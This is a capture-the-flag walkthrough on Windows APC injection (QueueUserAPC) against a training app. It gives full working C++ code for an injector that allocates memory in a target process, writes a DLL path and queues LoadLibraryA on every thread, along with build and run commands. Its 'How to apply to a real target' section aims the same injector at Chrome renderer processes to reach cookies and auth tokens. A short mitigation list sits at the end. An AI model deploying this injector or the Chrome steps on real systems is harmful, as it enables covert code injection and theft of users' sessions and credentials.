# #14 — APC Injection (QueueUserAPC)

**Difficulty:** EASY → MEDIUM — same memory setup as #13, different trigger.

## What is this attack?

**Instead of creating a new thread, you piggyback on one of the target's existing threads.** The target thread does your bidding (calls `LoadLibraryA`) the next time it enters a "wait for something" state.

## Why it works

An **APC** (Asynchronous Procedure Call) is a Windows kernel feature. Any thread can be told "when you next pause to wait for something, run this function first before going back to sleep". The function is queued; it fires automatically when the thread hits an **alertable wait**.

Normal use: file I/O completion routines, async socket callbacks.

Attacker use: queue `LoadLibraryA` with your DLL path as the APC's argument. First existing thread to enter an alertable wait pulls the trigger — your DLL loads.

### Why stealthier than #13

| Signal | #13 (CreateRemoteThread) | #14 (APC) |
|---|---|---|
| Thread count in Process Hacker | **+1 new thread** (RED FLAG) | No change |
| New thread start address | Points at your allocated RWX page | — (no new thread) |
| ETW `ThreadStart` event | Logged with your base address | Not emitted |

Analyst looking at Process Hacker's "Threads" tab sees nothing suspicious. The new DLL still appears in "Modules" but with no thread trail to the injector.

### Weakness of APC injection

The thread must enter an alertable wait. Many threads never do. **Fix:** queue the APC on ALL threads of the target — first alertable one wins.

For a GUI/WPF app like MVTC, this fires quickly because the message pump periodically does `MsgWaitForMultipleObjectsEx` with `MWMO_ALERTABLE`.

## When attackers use this

- You want a cleaner process tree (no `svchost.exe → yourthread` red flag)
- EDR hooks `CreateRemoteThread` but not `QueueUserAPC`
- The target has `ProcessDynamicCodePolicy` on (blocks RWX via `CreateRemoteThread`) but `QueueUserAPC` without allocation can still queue code via already-existing executable pages (advanced variant)

## Tools you need

Same as #13: MSVC, Process Hacker.

## Step-by-step

### Step 1 — Reuse #13's `flag_reader.dll`

Only change the needle to search for `v14_` instead of `v13_`:

```cpp
static const unsigned char NEEDLE[] = {
    'M',0,'V',0,'T',0,'C',0,'{',0,'v',0,'1',0,'4',0,'_',0
};
```

And change `OUT_PATH` to `C:\loot\flag14.txt`.

Build the same way:

```bash
cl /LD /EHsc /O2 /nologo flag_reader14.cpp /link /OUT:flag_reader14.dll
```

### Step 2 — Write the APC injector

Save as `injector14.cpp`:

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char** argv) {
    if (argc != 3) { printf("Usage: %s <PID> <DLL>\n", argv[0]); return 1; }
    DWORD pid = atoi(argv[1]);
    const char* dll = argv[2];

    // Same memory setup as #13
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    size_t len = strlen(dll) + 1;
    LPVOID buf = VirtualAllocEx(hProc, nullptr, len,
                                MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, buf, dll, len, nullptr);

    PTHREAD_START_ROUTINE llA = (PTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    // Enumerate ALL threads of the target
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    int queued = 0;
    if (Thread32First(snap, &te)) do {
        if (te.th32OwnerProcessID != pid) continue;
        HANDLE hT = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
        if (!hT) continue;
        // Queue "run LoadLibraryA(buf)" on this thread
        if (QueueUserAPC((PAPCFUNC)llA, hT, (ULONG_PTR)buf)) queued++;
        CloseHandle(hT);
    } while (Thread32Next(snap, &te));
    CloseHandle(snap);

    printf("[+] queued APC on %d threads, waiting for one to fire\n", queued);
    Sleep(3000);  // Give the host a moment to enter alertable state
    CloseHandle(hProc);
    return 0;
}
```

### Step 3 — Build and run

```bash
cl /EHsc /O2 /nologo injector14.cpp /link /OUT:injector14.exe
injector14.exe 6944 C:\full\path\to\flag_reader14.dll
```

### Step 4 — Read the flag

```powershell
type C:\loot\flag14.txt
```

## How to apply to a real target

For a web browser like Chrome (very APC-friendly because of all the I/O):

```powershell
# find a renderer process
Get-Process -Name chrome | Where-Object { $_.WorkingSet64 -gt 100MB } | Select-Object -First 1
injector14.exe <chrome_renderer_PID> C:\attacker\your_payload.dll
```

Your payload DLL has access to that renderer's cookies, auth tokens, and WebRTC streams.

## How defenders fix this

Same mitigations as #13. Specifically for APC:

- **`ProcessDynamicCodePolicy`** blocks the `VirtualAllocEx(RWX)` step
- **`ProcessStrictHandleCheckPolicy`** causes `OpenProcess(PROCESS_SET_CONTEXT)` to fail if the caller doesn't own the target
- **Attack Surface Reduction (ASR) rule `56a863a9-...`** blocks process creation that originates from PsExec/WMI/APC chain (indirect)

## Flag captured

```
MVTC{v14_apc_████████████████████}
```
